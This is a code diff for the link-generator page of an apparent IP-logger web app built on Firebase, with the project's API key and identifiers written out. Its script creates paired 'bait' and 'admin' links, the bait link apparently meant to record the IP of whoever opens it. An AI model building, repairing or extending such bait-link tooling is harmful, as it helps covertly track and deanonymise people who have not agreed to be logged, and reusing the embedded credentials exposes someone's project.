@@ -14,52 +14,52 @@
   <p id="admin"></p>
 
   <script type="module">
+    // ✅ Import from Firebase CDN instead of "firebase/app"
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-analytics.js";
+    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore.js";
 
-import { initializeApp } from "firebase/app";
-import { getAnalytics } from "firebase/analytics";
+    // ✅ Your Firebase config
+    const firebaseConfig = {
+      apiKey: "AIzaSyDB_KZ3PvzhxS2rW_MNoUle0quTS254plo",
+      authDomain: "ip-logger-hopefully-theone.firebaseapp.com",
+      projectId: "ip-logger-hopefully-theone",
+      storageBucket: "ip-logger-hopefully-theone.appspot.com", // ✅ fixed .app → .appspot.com
+      messagingSenderId: "162611845621",
+      appId: "1:162611845621:web:7b2f3280c58fc2043e28bc",
+      measurementId: "G-VQX9171CF5"
+    };
 
-const firebaseConfig = {
-  apiKey: "AIzaSyDB_KZ3PvzhxS2rW_MNoUle0quTS254plo",
-  authDomain: "ip-logger-hopefully-theone.firebaseapp.com",
-  projectId: "ip-logger-hopefully-theone",
-  storageBucket: "ip-logger-hopefully-theone.firebasestorage.app",
-  messagingSenderId: "162611845621",
-  appId: "1:162611845621:web:7b2f3280c58fc2043e28bc",
-  measurementId: "G-VQX9171CF5"
-};
+    // ✅ Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const db = getFirestore(app);
 
-
-const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
-
-
-    // ----- HELPER TO GENERATE RANDOM STRINGS -----
+    // Helper: random string generator
     function randomString(length) {
       const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-      return Array.from({length}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+      return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
     }
 
-    // ----- FUNCTION TO MAKE NEW LINKS -----
+    // Create new bait/admin link pair
     async function makeNew() {
       const sessionId = randomString(8);
       const code = randomString(6);
 
-      // Save the session with the code in Firestore
+      // Save session in Firestore
       await setDoc(doc(db, "links", sessionId), { code: code });
 
-      // Generate the links
+      // Build links
       const baitLink = window.location.origin + "/user.html?id=" + sessionId;
       const adminLink = window.location.origin + "/admin.html?id=" + sessionId + "&code=" + code;
 
-      // Display the links
+      // Display links
       document.getElementById("bait").innerHTML = `<a href="${baitLink}" target="_blank">${baitLink}</a>`;
       document.getElementById("admin").innerHTML = `<a href="${adminLink}" target="_blank">${adminLink}</a>`;
     }
 
-    // ----- CONNECT BUTTON -----
+    // Connect button
     document.getElementById("makeBtn").addEventListener("click", makeNew);
   </script>
 </body>
 </html>
-
-
